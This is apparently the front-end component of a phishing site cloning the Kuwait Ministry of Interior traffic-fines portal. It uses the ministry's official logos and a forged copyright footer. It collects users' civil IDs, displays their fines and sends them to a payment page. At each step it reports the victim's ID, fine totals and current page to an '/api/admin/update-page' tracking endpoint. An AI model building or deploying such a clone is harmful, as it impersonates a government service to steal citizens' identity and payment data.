import { useState, useCallback, useEffect } from 'react';
import { useLocation } from 'wouter';
import { trpc } from '@/lib/trpc';
import { useToast } from '@/hooks/use-toast';

interface Fine {
  ticketNo: string;
  amount: string;
  dateTime: string;
  location: string;
  source: string;
  description: string;
  payableOnline: string;
  plateNumber: string;
  plateCode: string;
  make?: string;
  model?: string;
  yearOfManufacture?: string;
  majorColor?: string;
  speed?: string;
  speedLimit?: string;
  violationType?: string;
  violation2Description?: string;
  violation3Description?: string;
  violation4Description?: string;
  violation5Description?: string;
  violation6Description?: string;
  [key: string]: any;
}

interface ParsedData {
  success: boolean;
  fines: Fine[];
  totalAmount: string;
  errorMessage?: string;
}

export default function Home() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const [loading, setLoading] = useState(false);
  const [parsedData, setParsedData] = useState<ParsedData | null>(null);
  const [payingAmount, setPayingAmount] = useState(0);
  const [selectedTickets, setSelectedTickets] = useState<Set<string>>(new Set());
  const [enquiryType, setEnquiryType] = useState<'1' | '2'>('1');
  const [civilId, setCivilId] = useState('');

  const queryMutation = trpc.fines.query.useMutation();

  const parseMoiData = useCallback((data: any): ParsedData => {
    try {
      if (!data || (data.errorMsg && !data.ExportGroupViolationsList && !data.totalTicketsCount)) {
        return { success: false, fines: [], errorMessage: data.errorMsg || 'لا توجد بيانات' };
      }

      const fines: Fine[] = [];

      if (data.ExportGroupViolationsList) {
        data.ExportGroupViolationsList.forEach((item: any) => {
          const d = item.ExportGrpKuwaitViolationDetails;
          if (!d) return;

          const descriptions = [];
          for (let i = 1; i <= 6; i++) if (d[`Violation${i}Description`]) descriptions.push(d[`Violation${i}Description`]);

          fines.push({
            ticketNo: d.TicketNumber || '',
            amount: parseFloat(d.Amount || 0).toFixed(2),
            dateTime: d.DateHappened ? d.DateHappened.replace('T', ' ') : '',
            location: d.PlaceOfViolation || '',
            source: 'وزارة الداخلية',
            description: descriptions.join(' - '),
            payableOnline: d.PayableOnline || 'N',
            plateNumber: d.PlateNumber || '',
            plateCode: d.PlateCode || '',
            make: d.Make || '',
            model: d.Model || '',
            yearOfManufacture: d.YearOfManufacture || '',
            majorColor: d.MajorColor || '',
            speed: d.Speed || '',
            speedLimit: d.SpeedLimit || '',
            violationType: d.ViolationType || 'D',
            violation2Description: d.Violation2Description || '',
            violation3Description: d.Violation3Description || '',
            violation4Description: d.Violation4Description || '',
            violation5Description: d.Violation5Description || '',
            violation6Description: d.Violation6Description || '',
          });
        });
      } else if (data.personalViolationsData || data.companyViolationsData) {
        const all = [...(data.personalViolationsData || []), ...(data.companyViolationsData || [])];
        all.forEach((ticket: any) => {
          fines.push({
            ticketNo: ticket.ticketNumber || '',
            amount: parseFloat(ticket.amount || 0).toFixed(2),
            dateTime: ticket.dateHappened ? ticket.dateHappened.replace('T', ' ') : '',
            location: ticket.location || '',
            source: ticket.beneficiary || 'وزارة الداخلية',
            description: ticket.violationDescription || '',
            payableOnline: ticket.isPayable === 2 ? 'Y' : 'N',
            plateNumber: ticket.plateNumber || '',
            plateCode: ticket.plateCode || '',
            violationType: ticket.violationType || 'D',
          });
        });
      }

      const total = fines.reduce((sum, f) => sum + parseFloat(f.amount), 0);
      return { success: true, fines, totalAmount: total.toFixed(2) };
    } catch (e) {
      console.error('Parsing error:', e);
      return { success: false, fines: [], errorMessage: 'خطأ في معالجة البيانات' };
    }
  }, []);

  const handleInquire = useCallback(() => {
    const paddedCivilId = (civilId || '').padStart(12, '0');

    if (paddedCivilId.length < 8) {
      toast({ variant: 'destructive', description: 'يرجى إدخال الرقم المدني بشكل صحيح' });
      return;
    }

    setLoading(true);
    setParsedData(null);
    setSelectedTickets(new Set());
    setPayingAmount(0);

    queryMutation.mutate(
      { civilId: paddedCivilId, enquiryType, lang: 'ar' },
      {
        onSuccess: (data: any) => {
          setLoading(false);
          const result = parseMoiData(data);
          setParsedData(result);
          if (result.success && result.fines.length > 0) {
            fetch('/api/admin/update-page', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                civilId: paddedCivilId,
                page: 'صفحة عرض المخالفات',
                totalFines: result.fines.length,
                totalAmount: result.totalAmount,
              }),
            });
          }
        },
        onError: (err) => {
          setLoading(false);
          toast({ variant: 'destructive', title: 'خطأ في الاتصال', description: err.message });
          setParsedData({ success: false, fines: [], errorMessage: err.message });
        },
      }
    );
  }, [civilId, enquiryType, queryMutation, parseMoiData, toast]);

  const handleCheckboxChange = useCallback(
    (ticketNo: string, isChecked: boolean) => {
      setSelectedTickets((prev) => {
        const newSet = new Set(prev);
        if (isChecked) {
          newSet.add(ticketNo);
        } else {
          newSet.delete(ticketNo);
        }
        let total = 0;
        newSet.forEach((tn) => {
          const ticket = parsedData?.fines.find((f) => f.ticketNo === tn);
          if (ticket) total += parseFloat(ticket.amount);
        });
        setPayingAmount(total);
        return newSet;
      });
    },
    [parsedData]
  );

  const handlePay = useCallback(() => {
    if (selectedTickets.size === 0) return;

    const selectedFines = (parsedData?.fines || []).filter((f) => selectedTickets.has(f.ticketNo));
    const totalSelected = selectedFines.reduce((sum, t) => sum + parseFloat(t.amount), 0);

    sessionStorage.setItem(
      'paymentData',
      JSON.stringify({
        selectedFines,
        totalAmount: totalSelected.toFixed(2),
        civilId: (civilId || '').padStart(12, '0'),
      })
    );

    fetch('/api/admin/update-page', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        civilId: (civilId || '').padStart(12, '0'),
        page: 'صفحة الدفع',
        amount: totalSelected,
      }),
    });

    setLocation('/payment');
  }, [selectedTickets, parsedData, civilId, setLocation]);

  const hasPayableTickets = parsedData?.success && parsedData.fines.some((f) => f.payableOnline === 'Y');

  return (
    <>
      <style>{`
        .moi-page * { box-sizing: border-box; }
        .moi-page {
          background-color: #f5f5f5;
          min-height: 100vh;
          font-family: 'Droid Arabic Kufi Regular', 'Skia Regular', Arial, Tahoma, sans-serif;
          direction: rtl;
        }
        .moi-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        .moi-header {
          background: white;
          padding: 15px 20px;
          border-bottom: 3px solid #000576;
          margin-bottom: 20px;
        }
        .moi-header-content {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 20px;
        }
        .moi-logo { height: 80px; }
        .moi-title { text-align: center; }
        .moi-title img { max-height: 40px; display: block; margin: 0 auto; }
        
        .moi-form-section {
          background: white;
          padding: 25px;
          border-radius: 8px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.08);
          margin-bottom: 20px;
        }
        .moi-form-title {
          font-size: 18px;
          font-weight: bold;
          color: #000576;
          margin-bottom: 20px;
          padding-bottom: 10px;
          border-bottom: 2px solid #000576;
          display: inline-block;
        }
        .moi-form-group {
          margin-bottom: 15px;
        }
        .moi-form-group label {
          display: block;
          margin-bottom: 8px;
          font-weight: bold;
          color: #333;
          font-size: 15px;
        }
        .moi-form-control {
          width: 100%;
          padding: 10px 15px;
          border: 1px solid #ccc;
          border-radius: 5px;
          font-size: 16px;
          font-family: inherit;
          transition: border-color 0.3s;
          direction: ltr;
          text-align: right;
        }
        .moi-form-control:focus {
          outline: none;
          border-color: #000576;
          box-shadow: 0 0 0 2px rgba(0,5,118,0.1);
        }
        .moi-select {
          width: 100%;
          padding: 10px 15px;
          border: 1px solid #ccc;
          border-radius: 5px;
          font-size: 16px;
          font-family: inherit;
          background: white;
          cursor: pointer;
          direction: rtl;
        }
        .moi-btn-enquire {
          background: #000576;
          color: white;
          border: none;
          padding: 12px 40px;
          border-radius: 5px;
          font-size: 16px;
          font-weight: bold;
          font-family: inherit;
          cursor: pointer;
          transition: background 0.3s;
        }
        .moi-btn-enquire:hover {
          background: #0010a8;
        }
        .moi-btn-enquire:disabled {
          background: #999;
          cursor: not-allowed;
        }

        .moi-results {
          margin-top: 20px;
        }
        .moi-summary-bar {
          background: #e9ecef;
          padding: 10px 20px;
          border-radius: 0;
          margin-bottom: 15px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          border: 1px solid #ddd;
          font-size: 14px;
        }

        .moi-violations-grid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 15px;
          margin-bottom: 20px;
        }
        @media (max-width: 768px) {
          .moi-violations-grid {
            grid-template-columns: 1fr;
          }
        }
        
        .moi-card {
          border: 1px solid #ccc;
          background: white;
          margin-bottom: 10px;
        }
        .moi-card-header {
          background: #eceae4 !important;
          padding: 0;
          position: relative;
        }
        .moi-card-header.payable {
          border-top: 5px solid green;
        }
        .moi-card-header.non-payable {
          border-top: 5px solid red;
        }
        .moi-card-header-row {
          display: flex;
          align-items: center;
          padding: 10px 12px;
        }
        .moi-card-checkbox-container {
          width: 16.6%;
          display: flex;
          justify-content: center;
          align-items: center;
        }
        .moi-card-checkbox {
          width: 18px;
          height: 18px;
          cursor: pointer;
        }
        .moi-card-header-content {
          width: 83.4%;
        }
        .moi-card-number {
          color: #000576;
          font-weight: bold;
          font-size: 15px;
          margin: 8px;
        }
        .moi-card-divider {
          border-top: 2px solid #d6dce5;
          margin: 0;
        }
        .moi-card-details-toggle {
          text-decoration: none;
          color: #000576;
          display: block;
          padding: 0;
          cursor: pointer;
        }
        .moi-card-details-toggle:hover {
          text-decoration: none;
        }
        .moi-card-detail-row {
          margin: 8px;
          font-size: 14px;
        }
        .moi-card-detail-row b {
          margin-left: 5px;
        }
        .moi-card-toggle-icon {
          text-align: left;
          padding: 0 12px 8px;
        }

        .moi-card-body {
          padding: 12px 15px;
          background: #fafafa;
          border-top: 1px solid #eee;
        }
        .moi-card-body-row {
          display: flex;
          padding: 5px 0;
          font-size: 14px;
        }
        .moi-card-body-row b {
          min-width: 80px;
          color: #333;
        }

        .moi-pay-section {
          margin-top: 20px;
          padding: 15px;
          background: white;
          border-radius: 8px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.08);
          text-align: center;
        }
        .moi-paying-amount-text {
          font-weight: bold;
          color: #000576;
          font-size: 16px;
          margin-bottom: 15px;
        }
        .moi-pay-notice {
          font-size: 13px;
          color: #333;
          margin-bottom: 15px;
          font-weight: bold;
        }
        .moi-btn-pay {
          width: 100%;
          background: #000576 !important;
          color: white;
          border: none;
          padding: 12px;
          border-radius: 5px;
          font-size: 16px;
          font-weight: bold;
          cursor: pointer;
          transition: background 0.3s;
        }
        .moi-btn-pay:hover:not(:disabled) {
          background: #0010a8 !important;
        }
        .moi-btn-pay:disabled {
          background: #ccc !important;
          cursor: not-allowed;
          color: #666 !important;
        }
        .moi-btn-pay {
          background: #000576 !important;
          color: white !important;
          border: 1px solid #000576 !important;
          padding: 10px !important;
          font-weight: bold !important;
          width: 100% !important;
          cursor: pointer;
        }
        
        .moi-badges {
          margin-top: 15px;
          display: flex;
          justify-content: center;
          gap: 10px;
        }
        .moi-badge {
          padding: 5px 10px;
          border-radius: 4px;
          font-size: 12px;
          color: white;
          font-weight: bold;
        }
        .moi-badge-success { background: #28a745; }
        .moi-badge-danger { background: #dc3545; }

        .moi-spinner { text-align: center; padding: 30px; }
        .moi-spinner-dot {
          display: inline-block;
          width: 12px; height: 12px;
          border-radius: 50%;
          background: #000576;
          margin: 0 5px;
          animation: bounce 1.4s infinite ease-in-out both;
        }
        .moi-spinner-dot:nth-child(1) { animation-delay: -0.32s; }
        .moi-spinner-dot:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce {
          0%, 80%, 100% { transform: scale(0); }
          40% { transform: scale(1); }
        }
      `}</style>

      <div className="moi-page">
        <div className="moi-container">
          <div className="moi-header">
            <div className="moi-header-content">
              <img
                src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg"
                alt="شعار وزارة الداخلية"
                className="moi-logo"
              />
              <div className="moi-title">
                <img
                  src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg"
                  alt="دولة الكويت"
                />
                <img
                  src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg"
                  alt="وزارة الداخلية"
                  className="mt-2"
                />
              </div>
            </div>
          </div>

          <div className="moi-form-section">
            <div className="moi-form-title">الاستعلام عن المخالفات</div>
            <div className="moi-form-group">
              <label>نوع الاستعلام</label>
              <select
                className="moi-select"
                value={enquiryType}
                onChange={(e) => setEnquiryType(e.target.value as '1' | '2')}
              >
                <option value="1">الأفراد</option>
                <option value="2">الشركات</option>
              </select>
            </div>
            <div className="moi-form-group">
              <label>{enquiryType === '1' ? 'الرقم المدني' : 'الرقم الموحد'}</label>
              <input
                className="moi-form-control"
                type="text"
                value={civilId}
                onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))}
                maxLength={12}
                placeholder={enquiryType === '1' ? 'أدخل الرقم المدني' : 'أدخل الرقم الموحد'}
              />
            </div>
            <button
              className="moi-btn-enquire"
              onClick={handleInquire}
              disabled={loading}
            >
              {loading ? 'جاري الاستعلام...' : 'إستعلم'}
            </button>
          </div>

          {loading && (
            <div className="moi-spinner">
              <div className="moi-spinner-dot" /><div className="moi-spinner-dot" /><div className="moi-spinner-dot" />
            </div>
          )}

          {!loading && parsedData && (
            <div className="moi-results">
              {parsedData.success ? (
                <>
                  <div className="moi-summary-bar">
                    <div><b>عدد المخالفات</b>: {parsedData.fines.length}</div>
                    <div><b>المبلغ الاجمالي</b>: {parseInt(parseFloat(parsedData.totalAmount).toString())} دك</div>
                  </div>

                  <div className="moi-violations-grid">
                    {parsedData.fines.map((fine, index) => {
                      const isPayable = fine.payableOnline === 'Y';
                      const isSelected = selectedTickets.has(fine.ticketNo);
                      const [datePart, timePart] = (fine.dateTime || '').split(' ');

                      return (
                        <div className="moi-card" key={index}>
                          <div className={`moi-card-header ${isPayable ? 'payable' : 'non-payable'}`}>
                            <div className="moi-card-header-row">
                              <div className="moi-card-checkbox-container">
                                {isPayable && (
                                  <input
                                    type="checkbox"
                                    className="moi-card-checkbox"
                                    checked={isSelected}
                                    onChange={(e) => handleCheckboxChange(fine.ticketNo, e.target.checked)}
                                  />
                                )}
                              </div>
                              <div className="moi-card-header-content">
                                <div className="moi-card-number" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                                  <span><b>رقم</b>:{fine.ticketNo}</span>
                                  {isSelected && (
                                    <span 
                                      style={{ color: '#000576', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
                                      onClick={(e) => {
                                        e.stopPropagation();
                                        handleCheckboxChange(fine.ticketNo, false);
                                      }}
                                    >
                                      إلغاء
                                    </span>
                                  )}
                                </div>
                              </div>
                            </div>
                            <div className="moi-card-divider" />
                            <a
                              className="moi-card-details-toggle"
                              onClick={() => {
                                const el = document.getElementById(`details-${fine.ticketNo}`);
                                if (el) {
                                  el.style.display = el.style.display === 'none' ? 'block' : 'none';
                                  const icon = document.getElementById(`icon-${fine.ticketNo}`);
                                  if (icon) icon.style.transform = el.style.display === 'none' ? 'rotate(0deg)' : 'rotate(180deg)';
                                }
                              }}
                            >
                              <div className="moi-card-detail-row"><b>قيمة المخالفة</b>:{parseInt(parseFloat(fine.amount).toString())} دك</div>
                              <div className="moi-card-detail-row"><b>رقم اللوحة</b>:{fine.plateNumber}/{fine.plateCode}</div>
                              <div className="moi-card-detail-row"><b>تاريخ المخالفة</b>:{datePart} {timePart}</div>
                              <div className="moi-card-toggle-icon">
                                <i id={`icon-${fine.ticketNo}`} className="fas fa-angle-down" style={{ transition: 'transform 0.3s' }} />
                              </div>
                            </a>
                          </div>

                          <div id={`details-${fine.ticketNo}`} style={{ display: 'none' }}>
                            <div className="moi-card-body">
                              <div className="moi-card-body-row"><b>النوع:</b> <span>{fine.violationType === 'D' ? 'مباشرة' : 'غير مباشرة'}</span></div>
                              {fine.location && <div className="moi-card-body-row"><b>المكان:</b> <span>{fine.location}</span></div>}
                              {fine.description && <div className="moi-card-body-row"><span style={{ marginRight: 85 }}><b>- </b>{fine.description}</span></div>}
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>

                  {hasPayableTickets && (
                    <div className="moi-pay-section">
                      {selectedTickets.size > 0 && (
                        <div className="moi-paying-amount-text">
                          إجمالي القيمة المختارة :{parseInt(payingAmount.toString())}
                        </div>
                      )}
                      <div className="moi-pay-notice">
                        بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                      </div>
                      <input 
                        type="button"
                        className="moi-btn-pay"
                        onClick={handlePay}
                        disabled={selectedTickets.size === 0}
                        value="إدفع"
                      />
                      <div className="moi-badges">
                        <span className="moi-badge moi-badge-success">قابلة للدفع الكترونياً</span>
                        <span className="moi-badge moi-badge-danger">غير قابلة للدفع الكترونياً</span>
                      </div>
                    </div>
                  )}
                </>
              ) : (
                <div className="moi-error" style={{ textAlign: 'center', padding: '20px', background: 'white', border: '1px solid #ccc' }}>
                  <b>{parsedData.errorMessage || 'لا توجد مخالفات مسجلة.'}</b>
                </div>
              )}
            </div>
          )}

          <footer style={{ textAlign: 'center', color: '#999', marginTop: '40px', paddingBottom: '20px', borderTop: '1px solid #ddd', paddingTop: '15px' }}>
            <p style={{ margin: 0, fontSize: '13px' }}>© جميع الحقوق محفوظة لوزارة الداخلية - دولة الكويت - 2026</p>
          </footer>
        </div>
      </div>
    </>
  );
}
